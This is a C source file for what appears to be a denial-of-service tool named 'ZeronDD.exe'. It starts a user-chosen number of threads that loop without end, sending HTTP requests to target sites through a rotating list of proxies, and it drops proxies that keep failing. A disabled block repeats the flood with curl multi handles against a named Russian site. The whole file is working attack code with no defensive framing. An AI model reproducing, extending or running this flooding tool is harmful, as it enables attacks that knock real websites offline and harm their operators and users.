#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <string.h>
#include "pthread.h"
#ifdef _WIN32
#include <windows.h>
#else
#include <unistd.h>
#endif

#include "proxy.h"
#include "http.h"

#ifdef _WIN32
#define usleep 	Sleep
#endif

static pthread_mutex_t 	mutex;
static int 				thread_proxy_index = 0;
static Proxy 			*proxy_list;
static int 				proxy_list_size = 0;
static unsigned char 	*proxy_failed;

#define MUTEX(CODE) 						\
	pthread_mutex_lock(&mutex);				\
	{										\
		CODE 								\
	}										\
	pthread_mutex_unlock(&mutex);

void *task(void *userdata)
{
	Proxy *proxy;
	HTTP *http;
	unsigned int proxy_index;
	long http_code;
	int id;


	id = (int) userdata;
	HTTP_Create(&http, id);
	#if 0
	HTTP_SetVerbose(http, true);
	#endif
	while (1)
	{
		MUTEX(
			if (thread_proxy_index >= proxy_list_size)
			{
				thread_proxy_index = 0;
				usleep(100);
			}
			proxy_index = thread_proxy_index;
			thread_proxy_index++;
		)

		if (proxy_failed[proxy_index] > 4)
		{
			continue;
		}

		proxy = &proxy_list[proxy_index];
		HTTP_SetURL(http, proxy->target_site);
		HTTP_SetProxy(http, proxy->ip, proxy->user_password);
		http_code = HTTP_Request(http);
		if ((http_code == 0) || (http_code >= 400))
		{
			proxy_failed[proxy_index]++;
		}
		else
		{
			MUTEX(
				if (proxy_failed[proxy_index] > 0)
					proxy_failed[proxy_index]--;
			)
			 printf("[%s][%d] SUCCESS\n", proxy->target_site, proxy_index);
		}

		usleep(20);
	}

	HTTP_Free(&http);
	return NULL;
}

#if 0
static void MultiAddAll()
{
  	CURLM *multi_handle = curl_multi_init();

	for (int i = 0; i < proxy_list_size; i++)
	{
		HTTP *http;
		HTTP_Create(&http);
		HTTP_SetURL(http, "1c.ru");
		HTTP_SetProxy(http, proxy_list[i].ip, proxy_list[i].user_password);

		curl_multi_add_handle(multi_handle, http->curl);
	}

START:
	printf("Start multi\n");
	int still_running = 1;
	while (still_running)
	{
		CURLMcode error = curl_multi_perform(multi_handle, &still_running);
		if (error)
		{
			printf("Multi error\n");
			return;
		}
	}
	printf("Multi done\n");

	struct CURLMsg *m;
	do 
	{
		int msgq = 0;
		m = curl_multi_info_read(multi_handle, &msgq);
		if(m && (m->msg == CURLMSG_DONE))
		{
			curl_multi_remove_handle(multi_handle, m->easy_handle);
			curl_multi_add_handle(multi_handle, m->easy_handle);

			if (m->data.result != 0)
			{
				// printf("perform error\n");
				continue;
			}
			long response_code;
			curl_easy_getinfo(m->easy_handle, CURLINFO_RESPONSE_CODE, &response_code);
			if (response_code != 200)
			{
				printf("perform http code: %ld\n", response_code);
				continue;
			}

			printf("success: %ld\n", response_code);
		}
	} while (m);

	goto START;
}
#endif


int main(int argc, char **argv)
{
	int i;
	unsigned int threads_count;
	pthread_t *threads_list;
	char *proxies_file_path = NULL;


	if (argc < 3)
	{
		printf("Usage: ZeronDD.exe [threads_count] [path_to_proxies]\n");
		return 0;
	}

	threads_count = atoi(argv[1]);
	proxies_file_path = argv[2];

	threads_list = malloc(threads_count * sizeof(pthread_t));

	HTTP_ModuleInit();
	pthread_mutex_init(&mutex, NULL);

	if (!Proxy_Load(proxies_file_path, &proxy_list, &proxy_list_size))
	{
		printf("Proxy_Load error\n");
		return 1;
	}
	printf("Read %d proxy\n", proxy_list_size);
	proxy_failed = calloc(proxy_list_size, sizeof(*proxy_failed));

	printf("Start %d threads\n", threads_count);
	for (i = 0; i < threads_count; i++)
	{
		pthread_create(threads_list + i, NULL, task, (void *) i);
	}

	for (i = 0; i < threads_count; i++)
	{
		pthread_join(threads_list[i], NULL);
	}

	pthread_mutex_destroy(&mutex);
	free(threads_list);
	free(proxy_list);
	HTTP_ModuleFree();
	
	return 0;
}